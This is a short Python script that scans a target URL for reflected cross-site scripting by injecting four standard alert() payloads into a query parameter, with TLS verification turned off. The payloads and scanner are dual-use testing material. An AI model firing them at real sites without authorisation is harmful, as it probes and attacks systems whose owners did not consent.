import requests
from colorama import Fore, Style, init

init(autoreset=True)

def xss_scan(target, verbose=False):
    print(Fore.CYAN + "[XSS SCAN STARTED]")
    
    # Add schema if missing
    if not target.startswith(("http://", "https://")):
        target = "https://" + target
    
    session = requests.Session()
    session.headers.update({'User-Agent': 'Mozilla/5.0'})

    payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')"
    ]

    vuln_found = False
    for payload in payloads:
        try:
            url = f"{target.rstrip('/')}?q={payload}"
            response = session.get(url, timeout=5, verify=False)
            if payload in response.text:
                print(Fore.RED + f"[XSS VULN] {url}")
                vuln_found = True
        except Exception as e:
            if verbose:
                print(Fore.YELLOW + f"[INFO] {url} - {e}")

    if not vuln_found:
        print(Fore.GREEN + "[XSS] No vulnerabilities found")
    print(Fore.CYAN + "[XSS SCAN COMPLETED]")